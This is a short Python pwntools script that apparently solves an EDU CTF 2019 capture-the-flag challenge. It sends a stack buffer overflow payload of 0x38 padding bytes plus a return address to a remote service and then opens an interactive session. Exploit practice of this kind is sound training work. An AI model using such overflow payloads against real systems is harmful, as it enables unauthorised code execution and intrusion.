import os
from pwn import *
rem = remote('edu-ctf.csie.org', 10170)
rem.recvuntil('Welcome to EDU CTF 2019.')
context.clear(arch='x86_64')

encoded = 'a' * 0x38 + str(p64(0x40068b))
rem.sendline(encoded)
rem.interactive()
